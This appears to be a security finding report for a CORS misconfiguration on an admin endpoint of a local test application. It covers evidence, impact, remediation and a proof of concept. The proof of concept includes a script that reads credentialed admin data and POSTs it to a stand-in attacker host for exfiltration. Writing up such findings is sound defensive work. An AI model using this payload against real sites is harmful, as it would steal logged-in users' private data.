# Reflected credentialed CORS allows cross-origin reads of authenticated admin data

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-11-10 01:12:44 UTC
**Target:** http://host.docker.internal:3001
**Endpoint:** /admin/venues
**Method:** GET
**CWE:** CWE-942
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Low

## Description

The API reflects arbitrary `Origin` values while enabling credentials, allowing a malicious website to read responses from authenticated endpoints when a user is logged in. This permits cross-origin disclosure of administrative venue data.

## Evidence

Authenticated request `218` returned venue data with attacker-controlled CORS headers:

```http
Origin: http://evil.example
Cookie: gioi_session=<authenticated-session>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://evil.example
Access-Control-Allow-Credentials: true
```

Unauthenticated baseline request `219` to the same endpoint returned `401`, demonstrating that the readable response requires the authenticated session. Preflight request `524` also completed, confirming the cross-origin flow is permitted.

## Impact

An attacker can host a page on an arbitrary origin and induce an authenticated administrator or staff user to visit it. The browser sends the `gioi_session` cookie and exposes API responses to attacker-controlled JavaScript, allowing unauthorized reading of data returned by `/admin/venues` and potentially other credentialed endpoints.

## Counterevidence

The exploit requires an authenticated victim and browser interaction; an attacker cannot read `/admin/venues` without the victim's session. However, the API explicitly reflects arbitrary origins and enables credentials, and the authenticated response was observed as `200` with venue data, so no effective origin restriction was present on this path.

## What Would Change This Severity

Confirmation that the same reflected policy covers additional high-sensitivity administrative endpoints or cross-tenant records would raise the impact; restricting the endpoint to a strict trusted-origin allowlist would eliminate the issue.

## Technical Analysis

The API accepts an attacker-controlled `Origin` header and responds with the same value in `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`. Browsers therefore permit scripts running on an arbitrary origin to issue credentialed requests and read the authenticated response. No strict origin allowlist was observed for this route.

## Proof of Concept

1. Authenticate to the application as a seeded administrative user and retain the resulting `gioi_session` cookie.
2. From a different origin controlled by the attacker, issue a cross-origin request to `http://host.docker.internal:3001/admin/venues` with `credentials: include`.
3. Observe that the response is readable by the attacker because the API reflects the attacker origin and permits credentials.
4. Compare with an unauthenticated request, which returns `401`, confirming that the disclosed content is protected by the session cookie.

````html
<script>
fetch('http://host.docker.internal:3001/admin/venues', {credentials: 'include'})
  .then(response => response.text())
  .then(data => fetch('https://attacker.example/collect', {
    method: 'POST',
    body: data
  }));
</script>
```

```http
GET /admin/venues HTTP/1.1
Host: host.docker.internal:3001
Origin: http://evil.example
Cookie: gioi_session=<authenticated-session>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://evil.example
Access-Control-Allow-Credentials: true
````

## Remediation

Configure CORS with an explicit allowlist of trusted production origins and reject all other origins. Never reflect the request `Origin` when credentials are enabled. Apply the same policy consistently to preflight and actual responses, and avoid enabling credentialed CORS on administrative endpoints unless it is strictly required.

## Assumptions

The victim must be logged in and visit an attacker-controlled origin while the session cookie is accepted by the API. The impact is directly exploitable in a browser when the service is reachable from the victim's browser, including an HTTPS deployment using the same cookie scope.
